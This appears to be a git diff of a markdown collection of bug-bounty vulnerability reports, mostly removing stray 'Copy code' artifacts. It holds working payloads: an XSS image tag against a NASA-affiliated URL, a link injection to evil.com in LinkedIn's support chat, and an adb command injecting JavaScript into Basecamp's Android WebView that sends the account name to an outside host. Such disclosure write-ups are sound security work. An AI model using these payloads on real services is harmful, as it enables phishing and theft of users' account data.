@@ -37,8 +37,6 @@ A DOM-based reflected script execution issue was identified on the NASA-affiliat
 ### Example Payload  
 https://nlsi.arc.nasa.gov/<img src=x onerror=alert('bugcrowd:ashmitsh4rma')>
 
-markdown
-Copy code
 Pasting this directly into the browser’s address bar triggers the payload, confirming that the page mishandles DOM insertion of path components.
 
 ### Impact  
@@ -72,10 +70,8 @@ A vulnerability was found in the LinkedIn Premium support chat widget. When a us
 3. This opens the survey URL with redirect parameters.  
 4. Wait for the support chat widget to load.  
 5. Submit the following HTML payload in the chat:  
-<a href="https://evil.com">CLICK</a>
+    ` <a href="https://evil.com">CLICK</a> `
 
-markdown
-Copy code
 6. The link appears rendered as an actual clickable element in the chat interface.
 
 ### Impact  
@@ -114,14 +110,9 @@ The Basecamp BC3 Android application contains a WebView with JavaScript enabled 
 3. Run the following command, replacing `XXXXX` with the user ID:  
 adb shell am start -W -a android.intent.action.VIEW -d 'https://3.basecamp.com/XXXXX/p","advance","---"); /* comment */ window.location.replace("https://example.com?exfiltration="+nativeBridge.getPage().accountName); //'
 
-markdown
-Copy code
 4. Monitor exfiltration through HTTP logs:  
 GET /?exfiltration=USER_EMAIL@gmail.com HTTP/2
 Host: example.com
-
-yaml
-Copy code
 
 ### Impact  
 - Full compromise of confidentiality, integrity, and availability  
